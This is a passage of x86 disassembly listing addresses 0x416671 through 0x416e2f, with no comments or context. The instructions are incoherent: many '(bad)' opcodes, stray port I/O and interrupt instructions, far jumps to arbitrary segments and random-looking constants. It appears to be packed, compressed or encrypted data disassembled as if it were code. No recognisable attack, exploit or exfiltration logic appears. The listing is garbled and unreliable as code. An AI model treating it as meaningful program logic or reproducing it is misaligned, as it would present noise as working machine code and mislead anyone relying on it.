  416671:	jp     0x416660
  416673:	fidiv  DWORD PTR [eax+esi*1+0x9]
  416677:	xchg   ecx,eax
  416678:	jge    0x416627
  41667a:	dec    ebp
  41667b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41667c:	sar    BYTE PTR [eax],1
  41667e:	scas   al,BYTE PTR es:[edi]
  41667f:	(bad)  
  416680:	xchg   edi,eax
  416681:	pop    es
  416682:	or     al,0x39
  416684:	pushf  
  416685:	int    0x2
  416687:	jge    0x41664d
  416689:	jmp    0x6f2e:0x63646d41
  416690:	addr16 lahf 
  416692:	mov    esi,0xda9af8f2
  416697:	and    ch,BYTE PTR [eax]
  416699:	in     al,0xd5
  41669b:	les    esi,FWORD PTR [esi-0xe]
  41669e:	or     DWORD PTR [esi+0x6e],eax
  4166a1:	xor    DWORD PTR [ebp+edx*2+0x11796df4],esp
  4166a8:	dec    ebx
  4166a9:	or     eax,0xc7d08a78
  4166ae:	jns    0x4166a0
  4166b0:	cmp    edi,edi
  4166b2:	icebp  
  4166b3:	inc    edi
  4166b4:	clc    
  4166b5:	not    BYTE PTR [ecx+0x3d35f5e8]
  4166bb:	sub    eax,0xf47e352
  4166c0:	nop
  4166c1:	mov    dh,0xcf
  4166c3:	xchg   esi,eax
  4166c4:	xchg   esp,eax
  4166c5:	(bad)  
  4166c6:	bound  edi,QWORD PTR [ebp+0x62]
  4166c9:	jo     0x416732
  4166cb:	xlat   BYTE PTR ds:[ebx]
  4166cc:	sbb    dl,ah
  4166ce:	xchg   DWORD PTR [ecx],esp
  4166d0:	retf   
  4166d1:	inc    ecx
  4166d2:	jl     0x4166d5
  4166d4:	cmp    DWORD PTR [ebp-0x15da9bb5],esi
  4166da:	(bad)  
  4166db:	jle    0x41668a
  4166dd:	or     DWORD PTR [ebx],esp
  4166df:	and    ecx,DWORD PTR [eax+0x110f8ffd]
  4166e5:	dec    ebp
  4166e6:	loopne 0x4166fc
  4166e8:	mov    ds:0x9b32ac36,al
  4166ed:	dec    edx
  4166ee:	out    0x43,eax
  4166f0:	sub    DWORD PTR [ebx],0x4d
  4166f3:	dec    eax
  4166f4:	xor    BYTE PTR [ecx],0x1b
  4166f7:	ins    DWORD PTR es:[edi],dx
  4166f8:	imul   ebp,DWORD PTR ds:0x6e11f578,0x20bf0087
  416702:	test   DWORD PTR [edi-0x2b],eax
  416705:	cmp    BYTE PTR [edi+0x68a143c0],bh
  41670b:	pop    eax
  41670c:	imul   ebp,DWORD PTR [ebx+0x3515dfec],0x58e9f0b5
  416716:	mov    eax,ds:0x6e4eb923
  41671b:	cwde   
  41671c:	xor    BYTE PTR [edi+ecx*2],bh
  41671f:	iret   
  416720:	push   ebx
  416721:	gs pop ss
  416723:	les    esi,FWORD PTR [edx+0x1000bf34]
  416729:	mov    bh,0xdf
  41672b:	(bad)  
  41672c:	adc    BYTE PTR [eax+eax*1-0x5083b1c0],dh
  416733:	(bad)  
  416734:	adc    eax,0xd81c65ec
  416739:	push   ds
  41673a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673b:	sbb    ch,ah
  41673d:	pop    ss
  41673e:	jnp    0x416744
  416740:	fimul  DWORD PTR [ebp+0x3f]
  416743:	push   ebp
  416744:	stc    
  416745:	cwde   
  416746:	dec    esp
  416747:	in     eax,0xa
  416749:	(bad)  
  41674a:	imul   ebp,DWORD PTR [ebp+0x12f54f76],0xbbe5f116
  416754:	(bad)  
  416755:	sti    
  416756:	push   0xffffffe2
  416758:	cli    
  416759:	inc    ecx
  41675a:	sub    al,0x97
  41675c:	or     al,0x24
  41675e:	stos   BYTE PTR es:[edi],al
  41675f:	xchg   BYTE PTR [ebp-0xcea8b6e],bl
  416765:	dec    eax
  416766:	icebp  
  416767:	mov    bl,0xd1
  416769:	daa    
  41676a:	sub    DWORD PTR ds:0x8beda904,esi
  416770:	xlat   BYTE PTR ds:[ebx]
  416771:	dec    esp
  416772:	rdtsc  
  416774:	mov    ebx,0xf5bfae01
  416779:	cmp    eax,0x4bd0c8a1
  41677e:	xchg   ecx,eax
  41677f:	mov    ss:0x9890783e,al
  416785:	fwait
  416786:	loop   0x4167a3
  416788:	ins    BYTE PTR es:[edi],dx
  416789:	cmp    edx,edi
  41678b:	shr    BYTE PTR [esi+eax*1-0x57c553eb],0x8d
  416793:	ja     0x4167d7
  416795:	xchg   esi,eax
  416796:	gs ins BYTE PTR es:[edi],dx
  416798:	inc    ecx
  416799:	push   esi
  41679a:	xor    DWORD PTR [ecx-0x710984ad],ebx
  4167a0:	fmul   st(3),st
  4167a2:	call   0x55e30663
  4167a7:	sahf   
  4167a8:	nop
  4167a9:	data16 int 0xe3
  4167ac:	in     eax,0xa
  4167ae:	mov    al,ds:0x6a7a4728
  4167b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167b4:	test   edi,esp
  4167b6:	aam    0x65
  4167b8:	test   DWORD PTR [esi],0x5495bbee
  4167be:	or     DWORD PTR [eax],esi
  4167c0:	pop    ds
  4167c1:	dec    ebp
  4167c2:	int3   
  4167c3:	mov    eax,0xfa5b30b7
  4167c8:	(bad)  
  4167c9:	sar    BYTE PTR [ebx],1
  4167cb:	xor    BYTE PTR ds:0xb6d47c37,al
  4167d1:	jmp    0x51d97a15
  4167d6:	mov    edx,0x2bfaab43
  4167db:	sub    eax,0xf1f13fdb
  4167e0:	cwde   
  4167e1:	scas   eax,DWORD PTR es:[edi]
  4167e2:	xchg   esi,eax
  4167e3:	push   0xffffffbb
  4167e5:	cmc    
  4167e6:	jmp    0x4167cb
  4167e8:	and    DWORD PTR [ecx-0x221afc36],edx
  4167ee:	sar    DWORD PTR [eax],1
  4167f0:	scas   al,BYTE PTR es:[edi]
  4167f1:	rol    BYTE PTR [ebx-0x48],0x1a
  4167f5:	add    al,0xfa
  4167f7:	aam    0xc2
  4167f9:	bound  esi,QWORD PTR [esi+0x5b451f54]
  4167ff:	addr16 jle 0x41682c
  416802:	fwait
  416803:	loope  0x41683e
  416805:	dec    eax
  416806:	(bad)  
  416807:	out    dx,al
  416808:	or     bh,BYTE PTR [edx-0x2253944]
  41680e:	mov    ds:0x8ecd7f0c,eax
  416813:	jecxz  0x41687e
  416815:	outs   dx,DWORD PTR ds:[esi]
  416816:	xor    DWORD PTR [esp+ebx*4+0xc],edi
  41681a:	outs   dx,BYTE PTR ds:[esi]
  41681b:	dec    ebx
  41681c:	loope  0x4167bc
  41681e:	xor    BYTE PTR [edx+edx*1-0x72],dl
  416822:	and    al,0x43
  416824:	inc    ecx
  416825:	push   edx
  416826:	push   eax
  416827:	adc    esp,ebp
  416829:	inc    ebx
  41682a:	sub    eax,0x24dc09bc
  41682f:	fistp  WORD PTR [edx+0x68313620]
  416835:	cmp    DWORD PTR [edx+0x3e],edx
  416838:	(bad)  
  416839:	mov    dl,0x65
  41683b:	adc    al,0x7d
  41683d:	data16 daa 
  41683f:	sub    DWORD PTR [eax+0x20af9d16],ebx
  416845:	push   edi
  416846:	push   esi
  416847:	mov    eax,ds:0x24d1faae
  41684c:	out    dx,al
  41684d:	inc    edi
  41684e:	mov    ds:0xaa117dc7,eax
  416853:	nop
  416854:	fiadd  DWORD PTR [ebx+eiz*8]
  416857:	lods   al,BYTE PTR ds:[esi]
  416858:	out    dx,al
  416859:	gs xor al,ah
  41685c:	mov    dl,0x12
  41685e:	out    dx,al
  41685f:	adc    eax,0x6770b898
  416864:	sub    bh,BYTE PTR [esi]
  416866:	lods   al,BYTE PTR ds:[esi]
  416867:	and    ah,BYTE PTR [ebx+0x76]
  41686a:	xor    al,bl
  41686c:	inc    edx
  41686d:	jbe    0x4168d4
  41686f:	fiadd  DWORD PTR [eax+0x7cb42177]
  416875:	scas   eax,DWORD PTR es:[edi]
  416876:	xchg   DWORD PTR [edi+0x7b],ebp
  416879:	clc    
  41687a:	stos   DWORD PTR es:[edi],eax
  41687b:	sti    
  41687c:	js     0x20928b26
  416882:	dec    esi
  416883:	or     bh,BYTE PTR [ebx-0x24c46814]
  416889:	adc    BYTE PTR [eax],cl
  41688b:	pusha  
  41688c:	nop
  41688d:	inc    esi
  41688e:	or     al,0x34
  416890:	mov    dl,0xc0
  416892:	jb     0x4168c6
  416894:	inc    ebp
  416895:	cs fs js 0x4168e2
  416899:	sbb    BYTE PTR [eax+0x60],bl
  41689c:	cmp    edx,DWORD PTR [edi+0x44]
  41689f:	int    0x2
  4168a1:	shl    DWORD PTR [edx+0xc16a6e],1
  4168a7:	mov    dh,0x38
  4168a9:	mov    dl,0x37
  4168ab:	stc    
  4168ac:	or     ebx,DWORD PTR [eax-0x6c]
  4168af:	loopne 0x416881
  4168b1:	mov    ds:0xf02bf78b,al
  4168b6:	inc    ebp
  4168b7:	mov    eax,0x75b92ed7
  4168bc:	fwait
  4168bd:	aaa    
  4168be:	mov    al,ds:0xba9bf97e
  4168c3:	ror    DWORD PTR [ebx],1
  4168c5:	and    ch,BYTE PTR [edi]
  4168c7:	data16 outs dx,BYTE PTR ds:[esi]
  4168c9:	and    BYTE PTR [ecx],bl
  4168cb:	push   ecx
  4168cc:	push   ebp
  4168cd:	xor    al,0x82
  4168cf:	fs jle 0x416906
  4168d2:	loopne 0x4168c9
  4168d4:	sub    ebp,ebx
  4168d6:	(bad)
  4168d9:	mov    edi,0x96fa8a3b
  4168de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4168df:	add    bl,BYTE PTR [ebx+eiz*8+0x45]
  4168e3:	xor    esi,DWORD PTR [ebx]
  4168e5:	mov    WORD PTR [ebx+0x52],?
  4168e8:	out    0x53,al
  4168ea:	inc    esp
  4168eb:	inc    esi
  4168ec:	nop
  4168ed:	js     0x41687d
  4168ef:	imul   edi,DWORD PTR [eax-0x7aea64cd],0xb5787572
  4168f9:	jb     0x41694f
  4168fb:	push   0xffffffc6
  4168fd:	pop    ss
  4168fe:	add    eax,0x146faf9a
  416903:	mov    cl,0x4f
  416905:	xor    ebx,DWORD PTR [eax+edx*8-0x6c4934cc]
  41690c:	adc    eax,edi
  41690e:	dec    edx
  41690f:	pushf  
  416910:	or     al,0x8d
  416912:	adc    BYTE PTR [edi],0x78
  416915:	int    0x42
  416917:	and    eax,0xed899a07
  41691c:	pop    ebx
  41691d:	adc    al,0x1c
  41691f:	mov    al,ds:0xa8061b4d
  416924:	ins    BYTE PTR es:[edi],dx
  416925:	fidivr WORD PTR [ebp-0x79617f66]
  41692b:	pusha  
  41692c:	mov    eax,0x13f4cfbf
  416931:	mov    edx,0x3e840a4
  416936:	lods   al,BYTE PTR ds:[esi]
  416937:	in     al,dx
  416938:	loopne 0x4168d4
  41693a:	xor    ebp,DWORD PTR ds:0xd26a11ec
  416940:	ds nop
  416942:	and    dh,ch
  416944:	ficomp WORD PTR [ecx-0x2ed8ba97]
  41694a:	mov    bh,0x98
  41694c:	pop    es
  41694d:	inc    eax
  41694e:	mov    bh,0x28
  416950:	dec    eax
  416951:	mov    ch,0xce
  416953:	call   0xa581:0x7e721150
  41695a:	arpl   bx,bx
  41695c:	nop
  41695d:	push   ds
  41695e:	dec    esp
  41695f:	out    dx,al
  416960:	pop    esi
  416961:	sti    
  416962:	mov    ds:0x435c55a2,eax
  416967:	add    DWORD PTR [ebp+0x71],esi
  41696a:	sub    BYTE PTR [edi],dh
  41696c:	inc    ebx
  41696d:	dec    esp
  41696e:	ret    0x9a74
  416971:	lock and ah,BYTE PTR [esi-0x501cde9]
  416978:	mov    dl,0x54
  41697a:	lock cmp BYTE PTR [eax-0x640ef386],ch
  416981:	add    ebx,DWORD PTR [esi+0x72]
  416984:	inc    esi
  416985:	jo     0x416958
  416987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416988:	pop    ebp
  416989:	sbb    eax,0x86974b14
  41698e:	shl    dl,1
  416990:	jae    0x4169b6
  416992:	addr16 pop es
  416994:	mov    dh,0xa6
  416996:	xchg   DWORD PTR [eax+esi*4],edx
  416999:	and    esp,0xffffff85
  41699c:	mov    BYTE PTR [esi+0x694a327a],0xa1
  4169a3:	mov    BYTE PTR [edx],dh
  4169a5:	sahf   
  4169a6:	loopne 0x416954
  4169a8:	out    dx,eax
  4169a9:	fsubr  DWORD PTR [edx-0x36e4a0ac]
  4169af:	mul    DWORD PTR [edx+0x46]
  4169b2:	es inc ecx
  4169b4:	push   cs
  4169b5:	mov    al,BYTE PTR [esi]
  4169b7:	sub    BYTE PTR [edx],0xc5
  4169ba:	xor    al,0xc3
  4169bc:	and    BYTE PTR [edx-0x379a2ab0],ch
  4169c2:	fisttp QWORD PTR [esi-0x7d]
  4169c5:	ss add eax,0xd3ff5465
  4169cb:	ret    0xfe6
  4169ce:	clc    
  4169cf:	mov    dh,0xec
  4169d1:	cdq    
  4169d2:	in     al,dx
  4169d3:	fiadd  WORD PTR [ebp-0x69]
  4169d6:	vandps xmm7,xmm1,XMMWORD PTR [edx+ebx*4+0x12]
  4169dd:	lods   eax,DWORD PTR ds:[esi]
  4169de:	(bad)  
  4169df:	push   cs
  4169e0:	shl    DWORD PTR [edx+ebx*8],cl
  4169e3:	mov    cs,WORD PTR [edx+eiz*2]
  4169e6:	int    0x60
  4169e8:	cmp    esp,DWORD PTR [edx+ecx*8-0x1d]
  4169ec:	adc    BYTE PTR [eax],cl
  4169ee:	inc    esi
  4169ef:	xchg   esp,eax
  4169f0:	or     eax,0xb87ac13c
  4169f5:	adc    eax,DWORD PTR [esi+0xfd63243]
  4169fb:	adc    eax,0x387efca8
  416a00:	lds    edi,FWORD PTR [esi]
  416a02:	mov    esi,0x99dce7d4
  416a07:	inc    esi
  416a08:	icebp  
  416a09:	mov    ds:0x80c29af3,al
  416a0e:	data16 and dh,ah
  416a11:	mov    eax,es:0xfeaee7c4
  416a17:	dec    esp
  416a18:	xchg   edx,eax
  416a19:	in     al,0x96
  416a1b:	ss or  eax,0x9f221c90
  416a21:	jbe    0x416a3a
  416a23:	rcr    DWORD PTR [edi+0x5e],1
  416a26:	aaa    
  416a27:	scas   eax,DWORD PTR es:[edi]
  416a28:	and    BYTE PTR [edi],0xfa
  416a2b:	inc    ebp
  416a2c:	pushf  
  416a2d:	xchg   ebp,eax
  416a2e:	cdq    
  416a2f:	mov    ecx,0x28ba849a
  416a34:	sub    dh,bl
  416a36:	fwait
  416a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a38:	mov    ebx,0x6e78071d
  416a3d:	and    al,0xf6
  416a3f:	dec    ebp
  416a40:	jo     0x416a8b
  416a42:	mov    dl,0xc9
  416a44:	push   eax
  416a45:	xchg   ebx,eax
  416a46:	sbb    BYTE PTR [edx-0x5a5533c8],dl
  416a4c:	jl     0x416a7c
  416a4e:	cld    
  416a4f:	push   esp
  416a50:	stos   DWORD PTR es:[edi],eax
  416a51:	enter  0xc885,0xee
  416a55:	xor    DWORD PTR [ecx-0x79],edx
  416a58:	inc    ecx
  416a59:	push   cs
  416a5a:	adc    ebx,edi
  416a5c:	popf   
  416a5d:	sub    DWORD PTR [edi-0x781863fa],edi
  416a63:	cmp    cl,BYTE PTR [ebx]
  416a65:	jo     0x416a7f
  416a67:	jle    0x416aba
  416a69:	jmp    0x4169f8
  416a6b:	enter  0x4b03,0x7a
  416a6f:	out    dx,al
  416a70:	cmp    ecx,DWORD PTR [eax+eiz*1]
  416a73:	stos   BYTE PTR es:[edi],al
  416a74:	pusha  
  416a75:	mov    esp,0x944d2d59
  416a7a:	pop    ebp
  416a7b:	fnstcw WORD PTR ds:0x37dbbc4
  416a81:	(bad)  
  416a82:	popa   
  416a83:	pusha  
  416a84:	jp     0x416a6e
  416a86:	fbstp  TBYTE PTR [eax+0x4e]
  416a89:	inc    esp
  416a8a:	frstor [ebp-0x5154b3d8]
  416a90:	aas    
  416a91:	push   esp
  416a92:	lds    edi,FWORD PTR [edi+0x71]
  416a95:	xchg   DWORD PTR ds:0x8c630e92,esi
  416a9b:	dec    BYTE PTR [ecx]
  416a9d:	dec    ebp
  416a9e:	jp     0x416a43
  416aa0:	mov    ah,cl
  416aa2:	(bad)  
  416aa3:	cld    
  416aa4:	mov    ebx,DWORD PTR [esp+ebx*2-0x1e7bae99]
  416aab:	ret    
  416aac:	les    ebp,FWORD PTR [ebp+0x3d]
  416aaf:	mov    cl,0xb2
  416ab1:	dec    esp
  416ab2:	and    BYTE PTR [edx+ebx*4+0x4],bh
  416ab6:	call   DWORD PTR [ebp+0x147d8fbf]
  416abc:	jb     0x416af5
  416abe:	out    dx,eax
  416abf:	in     eax,0x45
  416ac1:	jp     0x416acf
  416ac3:	(bad)  
  416ac4:	pop    ds
  416ac5:	sbb    dl,BYTE PTR [ebx-0x6b]
  416ac8:	sbb    eax,0xa1d355f5
  416acd:	gs push ebx
  416acf:	dec    esp
  416ad0:	and    BYTE PTR [esi-0x25],0x23
  416ad4:	js     0x416b34
  416ad6:	sub    edx,DWORD PTR [ecx-0x7]
  416ad9:	enter  0x84cf,0xad
  416add:	mov    ebp,0xddf2a755
  416ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ae3:	xor    DWORD PTR [esi-0x6f],esi
  416ae6:	push   edi
  416ae7:	cmc    
  416ae8:	test   BYTE PTR [esi+ebx*1+0x10f62a83],ah
  416aef:	sti    
  416af0:	popf   
  416af1:	fisubr WORD PTR [ebx-0x34]
  416af4:	dec    ecx
  416af5:	cdq    
  416af6:	pop    ebp
  416af7:	mov    ecx,esi
  416af9:	js     0x416b24
  416afb:	scas   eax,DWORD PTR es:[edi]
  416afc:	(bad)  
  416afd:	out    0x3f,al
  416aff:	cmp    BYTE PTR [esi-0x3],bh
  416b02:	jge    0x416aa2
  416b04:	sbb    ch,ah
  416b06:	and    dh,BYTE PTR [ecx+0x2e190767]
  416b0c:	mov    ds:0xb0d4d635,eax
  416b11:	fmul   st,st(0)
  416b13:	retf   
  416b14:	mov    ebx,0x3254ddd2
  416b19:	iret   
  416b1a:	pop    ecx
  416b1b:	int3   
  416b1c:	ja     0x416b00
  416b1e:	repnz pop ss
  416b20:	mov    ah,0x91
  416b22:	dec    esi
  416b23:	and    bl,bl
  416b25:	pop    eax
  416b26:	or     ah,BYTE PTR [ebx]
  416b28:	jne    0x416b7d
  416b2a:	pop    eax
  416b2b:	(bad)  
  416b2c:	mov    dh,0x72
  416b2e:	ror    BYTE PTR [ebp+ebx*4-0x6],0xb4
  416b33:	ret    0xda07
  416b36:	inc    edx
  416b37:	or     DWORD PTR [ebx-0x48],esp
  416b3a:	in     al,dx
  416b3b:	(bad)
  416b3e:	mov    ds:0x7b67f4bf,al
  416b43:	mov    bl,0xdd
  416b45:	push   ebp
  416b46:	jbe    0x416acb
  416b48:	mov    al,0xb
  416b4a:	xchg   edx,eax
  416b4b:	hlt    
  416b4c:	mov    dl,0x2
  416b4e:	xor    bp,WORD PTR [esi-0x6f644f6f]
  416b55:	ss dec ebp
  416b57:	xchg   ebx,eax
  416b58:	cmp    ebp,DWORD PTR [edx+0x15]
  416b5b:	retf   
  416b5c:	push   es
  416b5d:	xor    BYTE PTR [edi],al
  416b5f:	xchg   esp,ebx
  416b61:	push   edx
  416b62:	js     0x416b14
  416b64:	jb     0x416b30
  416b66:	mov    al,ds:0xb6396cc5
  416b6b:	jge    0x416b52
  416b6d:	fiadd  DWORD PTR [eax-0x26]
  416b70:	call   0x276adb5e
  416b75:	adc    bl,BYTE PTR [ecx-0x23]
  416b78:	sar    DWORD PTR [edx+0x5065cfe9],1
  416b7e:	call   0x3fb3:0x92d707c4
  416b85:	cli    
  416b86:	stos   DWORD PTR es:[edi],eax
  416b87:	aas    
  416b88:	xchg   edi,eax
  416b89:	pop    ecx
  416b8a:	fbld   TBYTE PTR [edi]
  416b8c:	or     eax,0x2fa21bb1
  416b91:	rcr    BYTE PTR [edi+0x799cb8d0],cl
  416b97:	lea    ecx,ds:0xeec3696
  416b9d:	aam    0x15
  416b9f:	daa    
  416ba0:	stos   BYTE PTR es:[edi],al
  416ba1:	xchg   edx,eax
  416ba2:	jmp    0x8f75:0xd9f02beb
  416ba9:	cmp    BYTE PTR [edx],dl
  416bab:	xchg   ecx,eax
  416bac:	jmp    0x416c01
  416bae:	sbb    ecx,eax
  416bb0:	call   0x6b0bf247
  416bb5:	or     bl,BYTE PTR gs:[esi-0x3fe5e225]
  416bbc:	daa    
  416bbd:	dec    esi
  416bbe:	add    ecx,DWORD PTR [edi-0x3a826d57]
  416bc4:	pop    eax
  416bc5:	mov    bl,0x1b
  416bc7:	fnsetpm(287 only) 
  416bc9:	stos   BYTE PTR es:[edi],al
  416bca:	stos   DWORD PTR es:[edi],eax
  416bcb:	sahf   
  416bcc:	dec    ecx
  416bcd:	pop    es
  416bce:	daa    
  416bcf:	clc    
  416bd0:	fisttp WORD PTR gs:[edi+eax*2-0x6e674549]
  416bd8:	xor    eax,DWORD PTR [ebp+0x6ce73909]
  416bde:	retf   0xd5ce
  416be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be2:	pop    ds
  416be3:	clc    
  416be4:	mov    al,0xce
  416be6:	pop    ecx
  416be7:	js     0x416b8b
  416be9:	or     al,BYTE PTR [esi]
  416beb:	sub    eax,0xfda68b48
  416bf0:	hlt    
  416bf1:	push   esi
  416bf2:	mov    esi,0x78331c3b
  416bf7:	pusha  
  416bf8:	and    ebx,DWORD PTR [ebx-0x57]
  416bfb:	dec    edx
  416bfc:	mov    ds:0x16073f07,al
  416c01:	addr16 or ecx,edx
  416c04:	pop    esi
  416c05:	push   ds
  416c06:	add    BYTE PTR ds:0x8cc1872d,cl
  416c0c:	mov    esi,0x2ae4f02a
  416c11:	je     0x416c3d
  416c13:	push   edi
  416c14:	sbb    cl,BYTE PTR [edi-0x32]
  416c17:	ror    DWORD PTR [ebp+0xa6d857c],cl
  416c1d:	xor    ch,bl
  416c1f:	(bad)  
  416c20:	jmp    0x3a195c65
  416c25:	xchg   cx,ax
  416c27:	test   eax,0x17d98570
  416c2c:	popa   
  416c2d:	or     eax,0x5031dd3d
  416c32:	scas   al,BYTE PTR es:[edi]
  416c33:	add    edi,DWORD PTR [ebp-0x196e2a2a]
  416c39:	sbb    DWORD PTR [ecx-0x1450e226],esi
  416c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c40:	xor    BYTE PTR [edi-0x23392e06],bl
  416c46:	mov    ?,WORD PTR [ebp+0x36]
  416c49:	daa    
  416c4a:	adc    eax,0x1d338122
  416c4f:	int    0x42
  416c51:	ret    0x5999
  416c54:	cmp    bh,BYTE PTR [ecx+0x67]
  416c57:	xchg   ebx,eax
  416c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c59:	mov    ebp,0xc09c68c9
  416c5e:	sahf   
  416c5f:	mov    edi,DWORD PTR [edx]
  416c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c62:	mov    ?,esp
  416c64:	or     edx,DWORD PTR [esp+eax*2+0xb]
  416c68:	cli    
  416c69:	mov    esi,0xf83eabfb
  416c6e:	cmp    dh,BYTE PTR [esi+0x2d]
  416c71:	nop
  416c72:	retf   0x15ca
  416c75:	mov    esi,0xfe572817
  416c7a:	push   0x52
  416c7c:	sbb    al,0xdc
  416c7e:	les    ebp,FWORD PTR [ebx-0x70bca36b]
  416c84:	stc    
  416c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c86:	jecxz  0x416ca9
  416c88:	mov    bh,0x89
  416c8a:	pop    ecx
  416c8b:	dec    DWORD PTR [edx+0x68ddd5ae]
  416c91:	iret   
  416c92:	xor    al,0x58
  416c94:	pop    ebp
  416c95:	or     ecx,DWORD PTR [ecx+0x48]
  416c98:	dec    ebx
  416c99:	(bad)  
  416c9b:	in     eax,dx
  416c9c:	dec    ecx
  416c9d:	in     al,0xe4
  416c9f:	push   edi
  416ca0:	clc    
  416ca1:	ins    BYTE PTR es:[edi],dx
  416ca2:	pop    ebx
  416ca3:	and    DWORD PTR [ecx-0x73],edx
  416ca6:	mov    bh,0xa
  416ca8:	jmp    0xf5a9e21
  416cad:	fdiv   QWORD PTR [edx]
  416caf:	sub    edx,DWORD PTR [ecx]
  416cb1:	mov    dl,BYTE PTR [ebp+0x6c56aeba]
  416cb7:	retf   
  416cb8:	sub    ecx,ecx
  416cba:	data16 cmp dl,dh
  416cbd:	jl     0x416c9a
  416cbf:	gs mov dl,0xec
  416cc2:	bound  esp,QWORD PTR [ebp+ecx*1+0x3123699c]
  416cc9:	mov    ds:0x596b6f0a,al
  416cce:	cli    
  416ccf:	iret   
  416cd0:	gs mov ebx,0x3f08ca74
  416cd6:	test   al,0x92
  416cd8:	adc    DWORD PTR [eax-0x1d],ecx
  416cdb:	cmp    al,0x9d
  416cdd:	(bad)  
  416cde:	mov    esp,0xbce56465
  416ce3:	sbb    edx,DWORD PTR [eax+0x5b2dfeee]
  416ce9:	std    
  416cea:	xchg   ecx,eax
  416ceb:	rol    BYTE PTR [eax-0x14],1
  416cee:	ja     0x416c7d
  416cf0:	push   eax
  416cf1:	leave  
  416cf2:	jnp    0x416ceb
  416cf4:	cmc    
  416cf5:	pushf  
  416cf6:	jecxz  0x416d3e
  416cf8:	pop    esp
  416cf9:	retf   0x890f
  416cfc:	gs xchg ecx,eax
  416cfe:	jns    0x416d68
  416d00:	sar    ah,1
  416d02:	clc    
  416d03:	mov    edi,0xbebaedb2
  416d08:	sahf   
  416d09:	xchg   esp,eax
  416d0a:	sar    DWORD PTR [eax+0x62e62b38],0x71
  416d11:	mov    ah,0x7d
  416d13:	or     cl,ah
  416d15:	dec    ebx
  416d16:	sub    cl,BYTE PTR [esi+0x1af938f2]
  416d1c:	xor    DWORD PTR [esi-0x21a440a0],esp
  416d22:	lahf   
  416d23:	iret   
  416d24:	into   
  416d25:	fucomp st(5)
  416d27:	(bad)  
  416d28:	pop    ebp
  416d29:	mov    dl,0x6a
  416d2b:	lock and BYTE PTR [edx-0x12],dh
  416d2f:	dec    esi
  416d30:	dec    ebx
  416d31:	inc    esi
  416d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d33:	loop   0x416d6d
  416d35:	arpl   WORD PTR [esi+0x5b16d15b],bp
  416d3b:	or     ebp,DWORD PTR [ecx-0x400620f0]
  416d41:	or     eax,0x517a8b21
  416d46:	inc    ecx
  416d47:	sar    BYTE PTR [esi],1
  416d49:	loope  0x416ccb
  416d4b:	retf   
  416d4c:	mov    ecx,0x6efe4f8c
  416d51:	push   ebp
  416d53:	imul   ebp,DWORD PTR ds:[ebx+0x47c680f1],0x24ce1d33
  416d5e:	pop    ebx
  416d5f:	mov    ch,0x29
  416d61:	(bad)  
  416d62:	push   ebp
  416d63:	inc    eax
  416d64:	repnz fs nop
  416d67:	test   BYTE PTR [esi+ebx*8],ch
  416d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d6b:	enter  0xd709,0x6f
  416d6f:	add    dh,ch
  416d71:	data16 rol BYTE PTR [ebp-0x7e626662],0x1
  416d79:	pop    ebx
  416d7a:	jns    0x416de3
  416d7c:	mov    eax,0xb128c2d9
  416d81:	push   ecx
  416d82:	mov    al,ds:0xe88e11bd
  416d87:	pop    ebp
  416d88:	lds    ebp,FWORD PTR [ebp+0x36e72309]
  416d8e:	repnz (bad) 
  416d91:	out    dx,al
  416d92:	dec    esi
  416d93:	add    bl,BYTE PTR [ebp-0x668f2670]
  416d99:	test   al,0x37
  416d9b:	pushf  
  416d9c:	repz fwait
  416d9e:	and    ebp,esi
  416da0:	mov    dh,0xf6
  416da2:	xlat   BYTE PTR ds:[ebx]
  416da3:	or     esi,DWORD PTR [ebx]
  416da5:	bound  eax,QWORD PTR ds:0xe2cc06fc
  416dab:	inc    ecx
  416dac:	jmp    0x416de2
  416dae:	dec    ebx
  416daf:	mov    ebp,0x10f5cc7c
  416db4:	das    
  416db5:	push   edi
  416db6:	(bad)  
  416db7:	sar    BYTE PTR [ebx],1
  416db9:	jbe    0x416d87
  416dbb:	in     al,dx
  416dbc:	repz fs mov esp,0x59b00b8b
  416dc3:	or     al,0x72
  416dc5:	jb     0x416dd6
  416dc7:	leave  
  416dc8:	shl    BYTE PTR [esi],0xbc
  416dcb:	cmp    al,BYTE PTR [ecx+0x5f]
  416dce:	or     ebp,edi
  416dd0:	mov    cl,0x26
  416dd2:	jg     0x416e17
  416dd4:	fs sbb al,0xf3
  416dd7:	in     al,dx
  416dd8:	push   es
  416dd9:	retf   0xedda
  416ddc:	enter  0xa873,0x2b
  416de0:	sbb    esi,DWORD PTR [edx+0x108dd08d]
  416de6:	fcmovbe st,st(2)
  416de8:	mov    dh,ch
  416dea:	shl    WORD PTR [esi+0x5b68279a],1
  416df1:	jae    0x416d88
  416df3:	or     ecx,DWORD PTR [bx+0x42]
  416df7:	mov    fs,WORD PTR [edx]
  416df9:	xor    ch,bl
  416dfb:	imul   ebx,DWORD PTR [eax+0x43],0x60
  416dff:	pushw  es
  416e01:	into   
  416e02:	mov    ss,WORD PTR [eax+ecx*8+0x312717e0]
  416e09:	stos   DWORD PTR es:[edi],eax
  416e0a:	mov    edx,0x2c43aaec
  416e0f:	gs pop edx
  416e11:	adc    esp,DWORD PTR [edx]
  416e13:	jg     0x416e1f
  416e15:	test   ebx,esi
  416e17:	sub    ecx,DWORD PTR [ecx]
  416e19:	inc    BYTE PTR [esi+0x789cd8e8]
  416e1f:	xor    esi,ebp
  416e21:	cdq    
  416e22:	mov    al,0x14
  416e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e25:	xor    BYTE PTR [ecx-0x32],0x97
  416e29:	ror    BYTE PTR [ebx+esi*4],cl
  416e2c:	lds    ebx,FWORD PTR [esp+esi*2]
  416e2f:	das    
